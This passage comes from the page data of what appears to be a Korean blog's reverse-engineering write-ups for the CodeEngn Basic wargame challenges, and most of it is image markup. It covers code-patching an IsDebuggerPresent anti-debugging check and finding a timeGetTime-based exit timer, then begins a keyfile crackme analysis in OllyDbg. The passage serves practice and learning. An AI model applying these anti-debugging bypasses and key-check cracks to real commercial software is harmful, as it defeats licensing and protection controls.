type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/dfcb24e7c85631b215f1573e10f82553/c08bc/6.png\"\n            alt=\"TEST\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>IsDebuggerPresent함수를 지난 후, EAX값을 And연산을 하여 그 결과가 0이 아닐 시 Jump를 수행한다. 아래는 Jump해서 도달하는 곳이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 11.515151515151516%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAa0lEQVR42mOwsDBzdHQwMTV1cXbQ0tHj1jeQspRQtlJWNFdUVFBUVFRUUFDQ0NTU19fT0dHR0tI2AANNTU1bW1sGSUlxJWUlMTFReVk5URlR5TgbThkuVi4WVjZWNhCCAkZGRgYYgLCFhYUBXcgNxi+6zygAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/d0e97e8e40bdd439c22c499139c46e2e/c9b55/7.webp 165w,\n/static/d0e97e8e40bdd439c22c499139c46e2e/f2908/7.webp 330w,\n/static/d0e97e8e40bdd439c22c499139c46e2e/ff4b8/7.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/d0e97e8e40bdd439c22c499139c46e2e/04c57/7.png 165w,\n/static/d0e97e8e40bdd439c22c499139c46e2e/d9ecf/7.png 330w,\n/static/d0e97e8e40bdd439c22c499139c46e2e/32056/7.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/d0e97e8e40bdd439c22c499139c46e2e/32056/7.png\"\n            alt=\"after jump\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>위에서 보았던 경고 구문임을 확인할 수 있다. IsDebuggerPresent 함수에서 리턴하는 EAX값을 0으로 만드는 방법도 있으나 MOV EAX,0으로 코드패치를 하는 방법을 선택했다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 381px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAy0lEQVR42l3EzWrCQBhG4TcxP2akA0l0MmOSiWYM+hFB0IUKahtQsJteQ+nOfXsvXbhx4dV4U4IbwcPDwbdKTpPqNDCJQ0FnXvTWo/7Hgr5qtfMWP53rjc8OjGtb1ygIIQEE63EQ/jN1ntLFmLHXWDgU2ER4l9hG2HbxSVhKrCJsbOyB46tQxLrUIitb7pvn2EPVazMfj0SUrOo0TmKZijwXruvgJSm6lRnk6bDthwFj1YTyLCtLo1TRNPr3j/ky4GPOp9ymFpgFPN0BbwwZKvDL7vkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6c5a3d54a7ec5950f9b2c69ce4c55fb0/c9b55/8.webp 165w,\n/static/6c5a3d54a7ec5950f9b2c69ce4c55fb0/f2908/8.webp 330w,\n/static/6c5a3d54a7ec5950f9b2c69ce4c55fb0/25250/8.webp 381w\"\n              sizes=\"(max-width: 381px) 100vw, 381px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6c5a3d54a7ec5950f9b2c69ce4c55fb0/04c57/8.png 165w,\n/static/6c5a3d54a7ec5950f9b2c69ce4c55fb0/d9ecf/8.png 330w,\n/static/6c5a3d54a7ec5950f9b2c69ce4c55fb0/2add2/8.png 381w\"\n            sizes=\"(max-width: 381px) 100vw, 381px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6c5a3d54a7ec5950f9b2c69ce4c55fb0/2add2/8.png\"\n            alt=\"codepatch\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>다음과 같이 코드패치를 하고 그대로 덤프를 뜬 파일로 디버깅을 진행한다. 전과 같은 안티디버깅은 일어나지 않았다. 이제 본래 하려고 했던 timeGetTime함수에 중단점들을 걸고 프로그램을 실행시켜 관찰해 보도록 하겠다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.06060606060606%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACBklEQVR42iXOS28SURwF8D81jGCIqfIS5v26M3PndYEiU42iwfIor0rbnTFuXfoF3Ndad42RusC60hhrISxsNDGAduPCpC2NX6JGk7I2LWd9fjkH1j7vb/VGb3uj7d3h+72fve/H3eFRdzjujcbd0bg3Ou7v//40OPzw9dfOt4Pd4VF3cNgdHPT3fvS7X2Dz4aP1wt1yoVQulxr16mK5uLrSarWatdpis14tlYrzuezN+Vv3CoU7+dtLzbOG5+VsHbXf7cC/WnWC1BSyMXF0XWVZ1nZs0zIwNhRVvkhRABCJ0oqq8jxHUiSRuAbnefF6G/6WKhNBTGmO4Vgm1kVJdInrOJZtW7qhBQOBKUZIEwTeJSRJJ30zMwCwsfUGTorlU0l0FUvWNZ5jYvGYKAm8wLEcR9NJv98PAOFIUlERw9KWbcXj8enyersDJ43GqYWvm2mT2Koi0kzSwLqmK0hTREmgqDMci7PYNFVV8m7kWI6Z4uftDvypNCbISGsudl0TY0mSSSrtuK7tuoaBA4FL57dZFRmCIJBUhmFY8F0AgGevOvCk+PiBWEPyMrZahr7EMEXHWbGsZUmq83yForIAdji8gFBD4CuK0qAoD3xpALz28iPk76/KGY9k83M5T8eOomGSyWLblZEpIePylWgwNMtLJpnLYZuks97VaCI0GwkGQ083Nv8D5kKIPRo+QCwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4ad29eefef5de9d9f18744936a2ded4b/c9b55/9.webp 165w,\n/static/4ad29eefef5de9d9f18744936a2ded4b/f2908/9.webp 330w,\n/static/4ad29eefef5de9d9f18744936a2ded4b/ff4b8/9.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4ad29eefef5de9d9f18744936a2ded4b/04c57/9.png 165w,\n/static/4ad29eefef5de9d9f18744936a2ded4b/d9ecf/9.png 330w,\n/static/4ad29eefef5de9d9f18744936a2ded4b/32056/9.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4ad29eefef5de9d9f18744936a2ded4b/32056/9.png\"\n            alt=\"004193AA\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>그대로 실행시켜 보니 다음과 같은 지점에서 멈추었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.424242424242426%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA0UlEQVR42kXLwU7DIBgA4B/oWtiA0gJd6kaxFNpli7dlyebSs8m8qNGLr+LDGw9m3/2Dn+C/W6+UDkNfC2le3sP1ea2U4KKUpZCcUkoZo7QAQLK0cYzObb33gnMYU99tQlU3u93UttvzyXeHtYkNdWxlOc0XCMG/DKCAOwSVqaW0QpZDdFoJfznH475zjW0qY9TmwdSac57TIgNAXChrpVIrxvK//vX5Mc+vWp/6cF0W09PbLc03offAPVo+YpwwSYSMGEeARMghW4yETBgngOEX8fMUMMdFO80AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/8fc83b74a71192ce3703f4931eba973b/c9b55/10.webp 165w,\n/static/8fc83b74a71192ce3703f4931eba973b/f2908/10.webp 330w,\n/static/8fc83b74a71192ce3703f4931eba973b/ff4b8/10.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/8fc83b74a71192ce3703f4931eba973b/04c57/10.png 165w,\n/static/8fc83b74a71192ce3703f4931eba973b/d9ecf/10.png 330w,\n/static/8fc83b74a71192ce3703f4931eba973b/32056/10.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/8fc83b74a71192ce3703f4931eba973b/32056/10.png\"\n            alt=\"timeGetTime\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>계속 실행시키면 다른 곳에서 멈추지 않고 창이 바로 떴다. 다른 곳은 참조하지 않는 것으로 판단했다. 리턴 값이 중요하니 함수 내부는 관찰하지 않았다. 444C3E에서 timeGetTime의 리턴값을 ESI에 넣고, 444C5F의 Sleep함수의 리턴값을 EAX에 넣어 이를 비교시킨다. 아래는 444C63의 JNB에서 분기하는 지점이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 393px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.878787878787882%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABRElEQVR42jXNy07CQBSA4dMz5dKkUErpZWbaofeWEpCgLyAsJBhY6UaNCRHR6MJLWKgxbvUZ1IXGFzUa/bb/4ocsWw827tTalSIfF9F1FN8iLhAPARaMj9Nkr997ytK1YDcETyrlVVk+LZeWinJeKi9BCNEpOlqdy7JcdIskiYPAb7e5WmeXZ/HuzLZDn+eO6HHda1iZ2Ux0kzY5Z4bRAN8XURwqioUouZ7rcmbbjk0tTWPzVVxMzVJLIgaACVAHaAE0AAj8odSJIl+pmkhIlGZ5nhDyHy9epMfnrWHa1BoAgBJKICEgIkq/YDweTSY7nOUAEIRBHIdhFA43B8JLRgfbvUnfYszkluWZBjV0qrmJS7nT1NVqFeDt9f3z42s2PwKAJE0Zo54Q3V6X8vz+wZruV9BSUUgYINqIbSQpwRoS+Bl/A6TnLGBjR7ZzAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/761e22df5f38ac22bf55aa3926b9bb00/c9b55/11.webp 165w,\n/static/761e22df5f38ac22bf55aa3926b9bb00/f2908/11.webp 330w,\n/static/761e22df5f38ac22bf55aa3926b9bb00/8efa6/11.webp 393w\"\n              sizes=\"(max-width: 393px) 100vw, 393px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/761e22df5f38ac22bf55aa3926b9bb00/04c57/11.png 165w,\n/static/761e22df5f38ac22bf55aa3926b9bb00/d9ecf/11.png 330w,\n/static/761e22df5f38ac22bf55aa3926b9bb00/d72ec/11.png 393w\"\n            sizes=\"(max-width: 393px) 100vw, 393px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/761e22df5f38ac22bf55aa3926b9bb00/d72ec/11.png\"\n            alt=\"444D3A\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>444D3A에서 EAX의 값이 [EBX+4]의 값보다 크지 않으면 timeGetTime 함수를 한번 더 거치게 되어 있다. [EBX+4]의 주소값에 들어 있는 값은 2B70이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 208px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.81818181818182%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAqklEQVR42m3Myw6CMBBA0aJBgg8wtGCntLXMTEGqJkb//9+MMaz0LO7yCjBwDoHGqGQDxnBEqRpvNDE9ni9iHmO05uS8o+BxsAPSLc2218UmF4jD/XYF0NYZZ8E7GC8TE+22pVis16ssy8QvDcDMfW9UK521Bk5d1zrvZHOsqkNdV/WxLopcCJF9fLusGqkuKc3X+bArB8RAUWvZtYoppDQjhnGK+/1W/PMGIaASHaY39H8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/8f3330937685204b1f2cc27dbd2be809/c9b55/12.webp 165w,\n/static/8f3330937685204b1f2cc27dbd2be809/b96c0/12.webp 208w\"\n              sizes=\"(max-width: 208px) 100vw, 208px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/8f3330937685204b1f2cc27dbd2be809/04c57/12.png 165w,\n/static/8f3330937685204b1f2cc27dbd2be809/8f2fb/12.png 208w\"\n            sizes=\"(max-width: 208px) 100vw, 208px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/8f3330937685204b1f2cc27dbd2be809/8f2fb/12.png\"\n            alt=\"10\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>2B70은 10진수로 11120이다. timeGetTime함수의 리턴값과 Sleep함수의 리턴값의 차가 이것을 넘지 않았을 시 계속 수행하는 것으로 보아 이 프로그램은 11120 밀리세컨드 뒤에 자동종료가 된다고 판단할 수 있다.</p>\n<p>정답: 11120</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"863e76d7-84c6-5dba-af60-c104121a3d66","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-19/","title":"CodeEngn Basic 19","readingTime":{"text":"4 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#d8c8c8","images":{"fallback":{"src":"/static/272a5737466fd6e246df148c9b6c4667/44060/0.png","srcSet":"/static/272a5737466fd6e246df148c9b6c4667/9b061/0.png 51w,\n/static/272a5737466fd6e246df148c9b6c4667/8155e/0.png 102w,\n/static/272a5737466fd6e246df148c9b6c4667/44060/0.png 203w","sizes":"(min-width: 203px) 203px, 100vw"},"sources":[{"srcSet":"/static/272a5737466fd6e246df148c9b6c4667/f9c43/0.webp 51w,\n/static/272a5737466fd6e246df148c9b6c4667/f4dc5/0.webp 102w,\n/static/272a5737466fd6e246df148c9b6c4667/41a9d/0.webp 203w","type":"image/webp","sizes":"(min-width: 203px) 203px, 100vw"}]},"width":660,"height":399.90147783251234}}}},"body":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 203px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 58.18181818181818%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACXklEQVR42k3QS2vUUBgG4Oz9Kf4Vd4IbN4ILXagVRaG0iyoUFamlhdrWtjPTud+SzKRzyeTSSTLJSXKSc5KcJCdzaUUKLlz5F2QYLIVn8fLxwgsf82Kj+Hy9sP659X67sbnDfzkSt/b7X0+VvZJx0nZOOfi96R5yKN8nZXnaNK55+0YmfyCORiZmHj47fvTq7Mnb3OO1/MsP7Np29+kmu7GvbB1quxX3awm+3tXeHIDNPN5upN+E6wP5d937e5Yv7BdYRhRV4WLU65uipAxHiiip6lhXL/WxNhnrpmFawHZc6LoQesj3MULBEvRcH3nMr0V8lelXsx0aoQWFswQmAUgjOw1AElgEmWloE2QSZAZQDz09xibByyONHGZG52n4qcfec6w2jcMImRdco1EtlHLH1XKhUT1XRGHU56rF3I+DvXqlUMyfGJqyyHASOsyCwhv7fthnwvEDzw3TCNQrpS7bEHus2OPYeolvlgdCu1kpin1e4GvF/Emrdt7lWwQDZkEtMFiXm+8uOx99F1DiWrpsapLvaLahQOvS0kf2RNHVIQRjSxsZY3GyJC2XZzRISDJNUxonaeTEoUMJTCM3CZ0s9m7zLPEz4mWxN028aeJniZeGDjOniGArDkAcgDR0ImSpUg9MFEuXVamnqUPLkMFE4dtVgkESOncxWexFyCIYEAziwEauPpYHEQIYGuXckdBhCbYJtgtnR8jV48BeNVeYm5/pnOKrabAyp6jD1rhWhW9Xu1y9y9b4dpVrVdhm+bbzX8goojC8WD72ljzsSsPO0qAzGnRWWRGFu52VfxqJD9K3naY7AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/272a5737466fd6e246df148c9b6c4667/c9b55/0.webp 165w,\n/static/272a5737466fd6e246df148c9b6c4667/cb011/0.webp 203w\"\n              sizes=\"(max-width: 203px) 100vw, 203px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/272a5737466fd6e246df148c9b6c4667/04c57/0.png 165w,\n/static/272a5737466fd6e246df148c9b6c4667/2efce/0.png 203w\"\n            sizes=\"(max-width: 203px) 100vw, 203px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/272a5737466fd6e246df148c9b6c4667/2efce/0.png\"\n            alt=\"start\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이 프로그램은 Key파일을 필요로 하는 프로그램이다. 위 문구가 출력되도록 하려면 crackme3.key 파일안의 데이터는 무엇이 되어야 하는가\r\nEx) 41424344454647\r\n(정답이 여러개 있는 문제로 인증시 맞지 않다고 나올 경우 게시판에 비공개로 올려주시면 확인해드리겠습니다</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 266px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 57.57575757575757%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABPElEQVR42s3Qy07CQBgF4El8Gd9AUbFcI6l0WnqB0oBIfBDd6wsYExagS0EZcKs+gmBskQjsiAmMnTJSQsAxRo3uLDu/nMXJn5zNDw72lzVF0jXVSKeyRjqpyoaeVGVJgoIIt5WEKEtQFD5KxtBlCcI4ryfVlKYkRAEcHS7F+Wg+t7OX381lM0oCpjSF34pEgtzmui8aDoYDnH9tNRoKyBIMcf4N34rAxwQ+FuL84OS4VDmvnJ2WCoVCuVxG1epnagjVEPrVvy41hKqXF1f1eqlYBL1Oz3Unz/2++dCaTKeMsTf2h/l8zhjrdbuAUooxJoQ4DsHeDAYDSmmjcQcIIS/fbG8wxuOxe99sAsdxvM/+z9i27eFwiBfx8zDXdSmlr4sYjUaz2cwyTdBuP1qW2WpZ3mNZZqfzdHtz/Q6ydULbhQUauQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/9af08ad88c7e45cc18c9571bb6f88c1c/c9b55/1.webp 165w,\n/static/9af08ad88c7e45cc18c9571bb6f88c1c/d8e38/1.webp 266w\"\n              sizes=\"(max-width: 266px) 100vw, 266px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/9af08ad88c7e45cc18c9571bb6f88c1c/04c57/1.png 165w,\n/static/9af08ad88c7e45cc18c9571bb6f88c1c/b4ffe/1.png 266w\"\n            sizes=\"(max-width: 266px) 100vw, 266px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/9af08ad88c7e45cc18c9571bb6f88c1c/b4ffe/1.png\"\n            alt=\"crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>그냥 실행시키면 다음과 같이 뜬다. Key파일이 있으면 문제와 같이 뜨는 걸로 추정된다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 418px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB+0lEQVR42k2Q227TQBRF/ZkQEpOChBBC4YkP4LcKSRyHNE1pLvb4FtvjuXlmPHh8mYS+o7RQdT0c7XOkvbV1rA9fv00mk8mnj18mn8dvh6M3A3s4sEePczgYvXn9JOzh4N3YtoeDK3s0Grx6fzUe20PLXa72+70zdxaOM5vNZtOpu1jM5467WMym05vVjeu6zmzuusvp9MfCcebz+c/lcnt///362ipLboyRUgohZCU552XJCKGcC0qZlJILwTm/iLKUQhJChBBVpQAAVp7neZaXJaeUJlGCMe77/vQCVvKigCXnjNE8h3/O577rtdZxHFlRFPuen2Y5zOH2fpskx77vuxdgTIIgyLIcFUUYhIQQpVRVVYf93krTLEszhHEBiwAECOGmabqu6/9DaRnHMUIYQuj7AADAhVBKeZ53MedZjjFmjCmlHh4ejDHPTmMMQiiKYoQKjEl6PCKEe2Pqug4AsCop2q5tm3/Uda21btu267r2EWPM6XR6Sjyfz8aYp2NRQAv43na3S4+p53me70dh6AOglGqaRuumbdv6Ea31c7TWuu97CKEF8/zgeQAASinG+LA/bLc7TMhvpXa7XRhGUspLySCM40QIobVOkoQQdvn23WazXq9vb9d3d78opUVRFBBSQp41Y4xSii5LwRhDCG02G8/zblarv11RIT8vF5f7AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/112c34d65c8dd751ed07706e03476791/c9b55/2.webp 165w,\n/static/112c34d65c8dd751ed07706e03476791/f2908/2.webp 330w,\n/static/112c34d65c8dd751ed07706e03476791/cd572/2.webp 418w\"\n              sizes=\"(max-width: 418px) 100vw, 418px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/112c34d65c8dd751ed07706e03476791/04c57/2.png 165w,\n/static/112c34d65c8dd751ed07706e03476791/d9ecf/2.png 330w,\n/static/112c34d65c8dd751ed07706e03476791/d7398/2.png 418w\"\n            sizes=\"(max-width: 418px) 100vw, 418px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/112c34d65c8dd751ed07706e03476791/d7398/2.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>PEiD로 프로그램에 대한 조사를 해 보니 아무런 패킹이 되어있지 않다. 이대로 올리디버거로 분석을 진행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 57.57575757575757%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB7UlEQVR42nWQSW/UQBCFq92L3bbb9tjuxfs+48wQJQSJoAACCQ1iCBw4ceEC/ASu/HhkKyiJEE+tPnR11fdewc8fv87Ovp5ffqv0rf70O3/zXW+Paj6Z3Uc9n6LhOI1fzovjRX1q1TGM3iXxMf57QJtSKbnd1UaGyW5XzFmq3TBxpRHBhgKAY3uBizlFwmPMJvBQTTNqk0slCRCU91wJtDxbAAgBAkB53pdNU7ftfLYXIoClYCGELYtAXY95XlZNwSmDcvLb0I8A8DJhbYayGsbtNIz906vLJ4f9NI11XRmjwyiEqu7TVE3bIfZ97/Xb4EVHWwCFUAAoBqAQC1kLP+VOkqZSpp7nMkYty1ptt2OWFf3QEGCHD4fkRkMBYADwXS5KPM4d13UZYwitjtYbVlddXpT92Anq4s8X9kvjNITVNvcdbjtLeuwSSuiqO+DDhWVZMc/bTZzkVb+bWy9lNGLcdbizNlucEIwxppTeM++3rTNtJKc2zpqgl2gD4Ky19ac2TTcOJjNlWRRF/gjedZOUWmkV+wL21+XzZ2Hk8oD7iU/4krsq+i7LtFKpTINAPCK33UKetoOK5eH2St9UYvDELMImtIMFwokXWYhgDP+qaUaZqnEaEhHp96+864r2iMSEYMIoMAYANvxHfwDcaTBRd562vgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7419fa8db3633b577368ff16c87d18fe/c9b55/3.webp 165w,\n/static/7419fa8db3633b577368ff16c87d18fe/f2908/3.webp 330w,\n/static/7419fa8db3633b577368ff16c87d18fe/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7419fa8db3633b577368ff16c87d18fe/04c57/3.png 165w,\n/static/7419fa8db3633b577368ff16c87d18fe/d9ecf/3.png 330w,\n/static/7419fa8db3633b577368ff16c87d18fe/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7419fa8db3633b577368ff16c87d18fe/32056/3.png\"\n            alt=\"first\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>올리디버거로 열었을 시의 첫 화면이다. CRACKME3.KEY라는 파일을 생성하고 이를 읽는 것을 볼 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.09090909090909%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABGklEQVR42mXNTU/CMADG8bYM3Gi3Dtgco1s3unYvQtRExHgyHkzUZCyw8aZcOPn9v4EJejD4y//0XB5wqOqPslqU5Xa7a07WTbOq1/tqdagWx83ma7/b1/Wqrpt/gBqnIhIs8FgwghCCX1o44pz5Warcnv2zIoTAGZVN8qtpXqRJIhjzXdf1PKffv4xiKVMZcm73bMcZUEoty0IItf4ARXE9mUyzXColbNvCBJumYRhECCWVUErxkLFw5Ptez6bnz8d0liSLsXgV4h3CWwBuTt1FcRnHb3mxHA5fTPOJ0ucufsTkHuM5IXNKHzqdGfhU03iccs7DMEKoDYAGYQsAPQgSziMps4HjYWwBADXtotsluo51g2Biddr6N+7FLD5aSAMRAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/e25a9c07173b1f1d212af20c0549a157/c9b55/4.webp 165w,\n/static/e25a9c07173b1f1d212af20c0549a157/f2908/4.webp 330w,\n/static/e25a9c07173b1f1d212af20c0549a157/ff4b8/4.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/e25a9c07173b1f1d212af20c0549a157/04c57/4.png 